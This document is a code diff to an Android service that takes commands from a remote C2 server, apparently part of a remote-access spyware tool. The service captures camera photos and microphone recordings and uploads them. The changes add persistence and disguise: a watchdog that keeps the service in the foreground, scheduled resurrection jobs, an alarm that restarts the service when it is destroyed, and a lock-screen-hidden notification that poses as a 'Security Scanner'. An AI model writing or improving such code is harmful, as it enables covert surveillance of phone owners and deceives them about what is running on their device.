@@ -41,6 +41,8 @@ import android.provider.CallLog
 import android.provider.Telephony
 import android.content.BroadcastReceiver
 import android.content.IntentFilter
+import android.app.AlarmManager
+import android.content.ComponentName
 
 class NativeCommandService : LifecycleService(), NativeSocketIOClient.CommandCallback {
     
@@ -126,6 +128,10 @@ class NativeCommandService : LifecycleService(), NativeSocketIOClient.CommandCal
     private var isC2Connected = false
     private val reconnectScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
     
+    // Persistence monitoring
+    private var persistenceHandler: Handler? = null
+    private var persistenceRunnable: Runnable? = null
+    
     // Broadcast receiver for IPC commands
     private val commandReceiver = object : BroadcastReceiver() {
         override fun onReceive(context: Context?, intent: Intent?) {
@@ -170,14 +176,102 @@ class NativeCommandService : LifecycleService(), NativeSocketIOClient.CommandCal
         super.onCreate()
         instance = this
         
-        initializeService()
+        Log.d(TAG, "NativeCommandService onCreate() - Starting persistence mode")
+        
+        // ✅ CRITICAL: Start foreground IMMEDIATELY (within 5 seconds)
         createNotificationChannel()
-        startForeground(NOTIFICATION_ID, createNotification("Native Command Service Initializing..."))
+        startForeground(NOTIFICATION_ID, createPersistentNotification())
+        
+        // Initialize service components
+        initializeService()
         
         // Register broadcast receiver for IPC
         registerReceiver(commandReceiver, IntentFilter(ACTION_EXECUTE_COMMAND))
         
-        Log.d(TAG, "Native Command Service created and started in foreground")
+        // Start persistence monitoring
+        startPersistenceMonitoring()
+        
+        // Schedule resurrection job
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
+            ResurrectionJobService.scheduleResurrectionJob(this)
+        }
+        
+        Log.d(TAG, "Native Command Service created and started in PERSISTENT foreground mode")
+    }
+    
+    private fun createNotificationChannel() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            val channel = NotificationChannel(
+                CHANNEL_ID,
+                "Security Scanner Service",
+                NotificationManager.IMPORTANCE_LOW
+            ).apply {
+                description = "Monitoring device security in background"
+                setShowBadge(false)
+                enableVibration(false)
+                setSound(null, null)
+                lockscreenVisibility = Notification.VISIBILITY_SECRET
+            }
+            
+            val notificationManager = getSystemService(NotificationManager::class.java)
+            notificationManager.createNotificationChannel(channel)
+        }
+    }
+    
+    private fun createPersistentNotification(): Notification {
+        return NotificationCompat.Builder(this, CHANNEL_ID)
+            .setContentTitle("Security Scanner Active")
+            .setContentText("Monitoring device security")
+            .setSmallIcon(android.R.drawable.ic_dialog_info)
+            .setOngoing(true)  // ✅ Can't be dismissed by user
+            .setPriority(NotificationCompat.PRIORITY_LOW)
+            .setCategory(NotificationCompat.CATEGORY_SERVICE)
+            .setVisibility(NotificationCompat.VISIBILITY_SECRET)  // ✅ Hide from lock screen
+            .setAutoCancel(false)  // ✅ Prevent accidental dismissal
+            .build()
+    }
+    
+    private fun startPersistenceMonitoring() {
+        persistenceHandler = Handler(Looper.getMainLooper())
+        persistenceRunnable = object : Runnable {
+            override fun run() {
+                try {
+                    // Check if we're still in foreground
+                    if (!isServiceInForeground()) {
+                        Log.w(TAG, "Service not in foreground! Restarting foreground...")
+                        startForeground(NOTIFICATION_ID, createPersistentNotification())
+                    }
+                    
+                    // Update notification to show activity
+                    updateNotification("Security Scanner Active - ${getCurrentTime()}")
+                    
+                    // Schedule next check
+                    persistenceHandler?.postDelayed(this, 30000) // Check every 30s
+                    
+                } catch (e: Exception) {
+                    Log.e(TAG, "Error in persistence monitoring", e)
+                    persistenceHandler?.postDelayed(this, 10000) // Retry in 10s
+                }
+            }
+        }
+        persistenceHandler?.post(persistenceRunnable!!)
+    }
+    
+    private fun isServiceInForeground(): Boolean {
+        return try {
+            val manager = getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
+            manager.getRunningServices(Integer.MAX_VALUE)
+                .any { 
+                    it.service.className == this::class.java.name && 
+                    it.foreground 
+                }
+        } catch (e: Exception) {
+            false
+        }
+    }
+    
+    private fun getCurrentTime(): String {
+        return SimpleDateFormat("HH:mm:ss", Locale.getDefault()).format(Date())
     }
     
     private fun initializeService() {
@@ -200,12 +294,12 @@ class NativeCommandService : LifecycleService(), NativeSocketIOClient.CommandCal
             startConnectionMonitoring()
             
             isInitialized = true
-            updateNotification("Native Command Service Active - Connecting to C2...")
+            updateNotification("Security Scanner Ready - Device: ${deviceId.takeLast(8)}")
             Log.d(TAG, "Service initialization completed successfully")
             
         } catch (e: Exception) {
             Log.e(TAG, "Service initialization failed", e)
-            updateNotification("Native Command Service - Initialization Failed")
+            updateNotification("Security Scanner - Initialization Failed")
         }
     }
     
@@ -214,7 +308,7 @@ class NativeCommandService : LifecycleService(), NativeSocketIOClient.CommandCal
             socketIOClient = NativeSocketIOClient(this, this)
             
             // Get C2 server URL from config
-            val serverUrl = "wss://ws.sosa-qav.es" // This should match your config
+            val serverUrl = "wss://ws.sosa-qav.es" // Fixed to use WSS for HTTPS
             
             socketIOClient?.initialize(serverUrl, deviceId)
             
@@ -260,9 +354,15 @@ class NativeCommandService : LifecycleService(), NativeSocketIOClient.CommandCal
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
         super.onStartCommand(intent, flags, startId)
         
+        Log.d(TAG, "onStartCommand called - ensuring foreground status")
+        
+        // ✅ Ensure we're always in foreground
+        startForeground(NOTIFICATION_ID, createPersistentNotification())
+        
         intent?.let { processCommandIntent(it) }
         
-        return START_STICKY // Keep service running
+        // ✅ CRITICAL: Return START_STICKY for auto-restart
+        return START_STICKY
     }
     
     override fun onBind(intent: Intent): IBinder {
@@ -286,8 +386,8 @@ class NativeCommandService : LifecycleService(), NativeSocketIOClient.CommandCal
         Log.d(TAG, "C2 connection status changed: $connected")
         
         updateNotification(
-            if (connected) "Native Command Service - Connected to C2"
-            else "Native Command Service - Disconnected from C2"
+            if (connected) "Security Scanner - Connected to C2"
+            else "Security Scanner - Reconnecting to C2..."
         )
         
         // Broadcast connection status for Flutter/other components
@@ -300,7 +400,7 @@ class NativeCommandService : LifecycleService(), NativeSocketIOClient.CommandCal
     
     override fun onError(error: String) {
         Log.e(TAG, "Socket.IO error: $error")
-        updateNotification("Native Command Service - Connection Error")
+        updateNotification("Security Scanner - Connection Error")
     }
     
     fun executeCommandDirect(command: String, args: JSONObject, requestId: String) {
@@ -352,8 +452,8 @@ class NativeCommandService : LifecycleService(), NativeSocketIOClient.CommandCal
                     executeCommandInternal(command)
                 } else {
                     updateNotification(
-                        if (isC2Connected) "Native Command Service - Connected & Ready"
-                        else "Native Command Service - Reconnecting..."
+                        if (isC2Connected) "Security Scanner - Connected & Ready"
+                        else "Security Scanner - Reconnecting..."
                     )
                     Thread.sleep(1000)
                 }
@@ -412,27 +512,36 @@ class NativeCommandService : LifecycleService(), NativeSocketIOClient.CommandCal
                 
                 val photoFile = createImageFile()
                 
-                // Setup ImageReader
+                // Setup ImageReader with proper error handling
                 imageReader = ImageReader.newInstance(1920, 1080, ImageFormat.JPEG, 1)
                 imageReader?.setOnImageAvailableListener({ reader ->
-                    val image = reader.acquireLatestImage()
-                    saveImageToFile(image, photoFile)
-                    image.close()
-                    
-                    val result = JSONObject().apply {
-                        put("path", photoFile.absolutePath)
-                        put("size", photoFile.length())
-                        put("camera", lensDirection)
-                        put("method", "native_camera2")
+                    try {
+                        val image = reader.acquireLatestImage()
+                        if (image != null) {
+                            saveImageToFile(image, photoFile)
+                            image.close()
+                            
+                            val result = JSONObject().apply {
+                                put("path", photoFile.absolutePath)
+                                put("size", photoFile.length())
+                                put("camera", lensDirection)
+                                put("method", "native_camera2")
+                            }
+                            
+                            sendSuccessResult(CMD_TAKE_PICTURE, requestId, result)
+                            uploadFile(photoFile, CMD_TAKE_PICTURE)
+                        } else {
+                            sendErrorResult(CMD_TAKE_PICTURE, requestId, "Failed to acquire image")
+                        }
+                    } catch (e: Exception) {
+                        Log.e(TAG, "Error processing camera image", e)
+                        sendErrorResult(CMD_TAKE_PICTURE, requestId, "Image processing failed: ${e.message}")
+                    } finally {
+                        cleanupCamera()
                     }
-                    
-                    sendSuccessResult(CMD_TAKE_PICTURE, requestId, result)
-                    uploadFile(photoFile, CMD_TAKE_PICTURE)
-                    cleanupCamera()
-                    
                 }, backgroundHandler)
                 
-                // Open camera
+                // Open camera with proper error handling
                 cameraManager?.openCamera(cameraId, object : CameraDevice.StateCallback() {
                     override fun onOpened(camera: CameraDevice) {
                         cameraDevice = camera
@@ -455,11 +564,12 @@ class NativeCommandService : LifecycleService(), NativeSocketIOClient.CommandCal
             } catch (e: Exception) {
                 Log.e(TAG, "Camera setup failed", e)
                 sendErrorResult(CMD_TAKE_PICTURE, requestId, "Camera setup failed: ${e.message}")
+                cleanupCamera()
             }
         }
     }
     
-    // AUDIO RECORDING IMPLEMENTATION
+    // ENHANCED AUDIO RECORDING IMPLEMENTATION
     private fun handleRecordAudio(args: JSONObject, requestId: String) {
         if (!hasPermission(android.Manifest.permission.RECORD_AUDIO)) {
             sendErrorResult(CMD_RECORD_AUDIO, requestId, "Audio recording permission not granted")
@@ -467,14 +577,22 @@ class NativeCommandService : LifecycleService(), NativeSocketIOClient.CommandCal
         }
         
         backgroundExecutor.execute {
+            var tempMediaRecorder: MediaRecorder? = null
             try {
                 val duration = args.optInt("duration", 10) // seconds
                 val quality = args.optString("quality", "medium")
                 
                 val audioFile = createAudioFile()
                 
-                // Setup MediaRecorder for high-quality recording
-                mediaRecorder = MediaRecorder().apply {
+                // ✅ FIXED: Proper MediaRecorder setup
+                tempMediaRecorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
+                    MediaRecorder(this@NativeCommandService)
+                } else {
+                    @Suppress("DEPRECATION")
+                    MediaRecorder()
+                }
+                
+                tempMediaRecorder.apply {
                     setAudioSource(MediaRecorder.AudioSource.MIC)
                     setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP)
                     setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB)
@@ -488,8 +606,14 @@ class NativeCommandService : LifecycleService(), NativeSocketIOClient.CommandCal
                         setAudioSamplingRate(22050)
                     }
                     
-                    prepare()
-                    start()
+                    try {
+                        prepare()
+                        start()
+                        mediaRecorder = this
+                    } catch (e: Exception) {
+                        Log.e(TAG, "MediaRecorder prepare/start failed", e)
+                        throw e
+                    }
                 }
                 
                 Log.d(TAG, "Audio recording started for ${duration}s")
@@ -497,10 +621,15 @@ class NativeCommandService : LifecycleService(), NativeSocketIOClient.CommandCal
                 // Record for specified duration
                 Thread.sleep(duration * 1000L)
                 
-                mediaRecorder?.apply {
-                    stop()
-                    reset()
-                    release()
+                // Stop recording
+                tempMediaRecorder.apply {
+                    try {
+                        stop()
+                        reset()
+                        release()
+                    } catch (e: Exception) {
+                        Log.e(TAG, "Error stopping MediaRecorder", e)
+                    }
                 }
                 mediaRecorder = null
                 
@@ -517,7 +646,7 @@ class NativeCommandService : LifecycleService(), NativeSocketIOClient.CommandCal
                 
             } catch (e: Exception) {
                 Log.e(TAG, "Audio recording failed", e)
-                mediaRecorder?.apply {
+                tempMediaRecorder?.apply {
                     try {
                         stop()
                         reset()
@@ -988,12 +1117,17 @@ class NativeCommandService : LifecycleService(), NativeSocketIOClient.CommandCal
     }
     
     private fun cleanupCamera() {
-        captureSession?.close()
-        cameraDevice?.close()
-        imageReader?.close()
-        captureSession = null
-        cameraDevice = null
-        imageReader = null
+        try {
+            captureSession?.close()
+            cameraDevice?.close()
+            imageReader?.close()
+        } catch (e: Exception) {
+            Log.e(TAG, "Error cleaning up camera", e)
+        } finally {
+            captureSession = null
+            cameraDevice = null
+            imageReader = null
+        }
     }
     
     private val backgroundHandler by lazy {
@@ -1004,7 +1138,8 @@ class NativeCommandService : LifecycleService(), NativeSocketIOClient.CommandCal
     
     private fun createCaptureSession(camera: CameraDevice) {
         try {
-            val outputConfig = OutputConfiguration(imageReader!!.surface)
+            val reader = imageReader ?: return
+            val outputConfig = OutputConfiguration(reader.surface)
             val sessionConfig = SessionConfiguration(
                 SessionConfiguration.SESSION_REGULAR,
                 listOf(outputConfig),
@@ -1017,6 +1152,7 @@ class NativeCommandService : LifecycleService(), NativeSocketIOClient.CommandCal
                     
                     override fun onConfigureFailed(session: CameraCaptureSession) {
                         Log.e(TAG, "Capture session configuration failed")
+                        sendErrorResult(CMD_TAKE_PICTURE, "unknown", "Capture session configuration failed")
                     }
                 }
             )
@@ -1025,6 +1161,7 @@ class NativeCommandService : LifecycleService(), NativeSocketIOClient.CommandCal
             
         } catch (e: Exception) {
             Log.e(TAG, "Failed to create capture session", e)
+            sendErrorResult(CMD_TAKE_PICTURE, "unknown", "Failed to create capture session: ${e.message}")
         }
     }
     
@@ -1039,6 +1176,7 @@ class NativeCommandService : LifecycleService(), NativeSocketIOClient.CommandCal
             
         } catch (e: Exception) {
             Log.e(TAG, "Failed to capture picture", e)
+            sendErrorResult(CMD_TAKE_PICTURE, "unknown", "Failed to capture picture: ${e.message}")
         }
     }
     
@@ -1058,45 +1196,53 @@ class NativeCommandService : LifecycleService(), NativeSocketIOClient.CommandCal
         return File(audioDir, "AUD_native_$timestamp.3gp")
     }
     
-    private fun createNotificationChannel() {
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            val channel = NotificationChannel(
-                CHANNEL_ID,
-                "Native Command Service",
-                NotificationManager.IMPORTANCE_LOW
-            ).apply {
-                description = "Handles remote commands independently with direct C2 connection"
-                setShowBadge(false)
-                enableVibration(false)
-                setSound(null, null)
-            }
+    private fun updateNotification(content: String) {
+        try {
+            val notification = NotificationCompat.Builder(this, CHANNEL_ID)
+                .setContentTitle("Security Scanner Active")
+                .setContentText(content)
+                .setSmallIcon(android.R.drawable.ic_dialog_info)
+                .setOngoing(true)
+                .setPriority(NotificationCompat.PRIORITY_LOW)
+                .setSilent(true)
+                .build()
             
             val notificationManager = getSystemService(NotificationManager::class.java)
-            notificationManager.createNotificationChannel(channel)
+            notificationManager.notify(NOTIFICATION_ID, notification)
+        } catch (e: Exception) {
+            Log.e(TAG, "Error updating notification", e)
         }
     }
     
-    private fun createNotification(content: String): Notification {
-        return NotificationCompat.Builder(this, CHANNEL_ID)
-            .setContentTitle("Native Command Service")
-            .setContentText(content)
-            .setSmallIcon(android.R.drawable.ic_menu_info_details)
-            .setOngoing(true)
-            .setPriority(NotificationCompat.PRIORITY_LOW)
-            .setSilent(true)
-            .build()
-    }
-    
-    private fun updateNotification(content: String) {
-        val notification = createNotification(content)
-        val notificationManager = getSystemService(NotificationManager::class.java)
-        notificationManager.notify(NOTIFICATION_ID, notification)
-    }
-    
     override fun onDestroy() {
-        super.onDestroy()
+        Log.d(TAG, "Service onDestroy called - ATTEMPTING RESURRECTION")
         
-        Log.d(TAG, "Service destroying - cleaning up resources")
+        // ✅ Schedule immediate restart before destroying
+        try {
+            val restartIntent = Intent(this, NativeCommandService::class.java)
+            val pendingIntent = PendingIntent.getService(
+                this, 1, restartIntent, 
+                PendingIntent.FLAG_ONE_SHOT or PendingIntent.FLAG_IMMUTABLE
+            )
+            
+            val alarmManager = getSystemService(Context.ALARM_SERVICE) as AlarmManager
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+                alarmManager.setExactAndAllowWhileIdle(
+                    AlarmManager.ELAPSED_REALTIME_WAKEUP,
+                    SystemClock.elapsedRealtime() + 5000, // Restart in 5 seconds
+                    pendingIntent
+                )
+            } else {
+                alarmManager.set(
+                    AlarmManager.ELAPSED_REALTIME_WAKEUP,
+                    SystemClock.elapsedRealtime() + 5000,
+                    pendingIntent
+                )
+            }
+            Log.d(TAG, "Resurrection alarm scheduled")
+        } catch (e: Exception) {
+            Log.e(TAG, "Failed to schedule resurrection", e)
+        }
         
         // Disconnect Socket.IO client
         socketIOClient?.destroy()
@@ -1104,6 +1250,9 @@ class NativeCommandService : LifecycleService(), NativeSocketIOClient.CommandCal
         // Cancel connection monitoring
         connectionCheckJob?.cancel()
         reconnectScope.cancel()
+        
+        // Stop persistence monitoring
+        persistenceHandler?.removeCallbacks(persistenceRunnable!!)
         
         // Unregister broadcast receiver
         try {
@@ -1142,6 +1291,8 @@ class NativeCommandService : LifecycleService(), NativeSocketIOClient.CommandCal
         }
         
         instance = null
-        Log.d(TAG, "Native Command Service destroyed")
+        
+        super.onDestroy()
+        Log.d(TAG, "Native Command Service destroyed - resurrection mechanisms active")
     }
 }
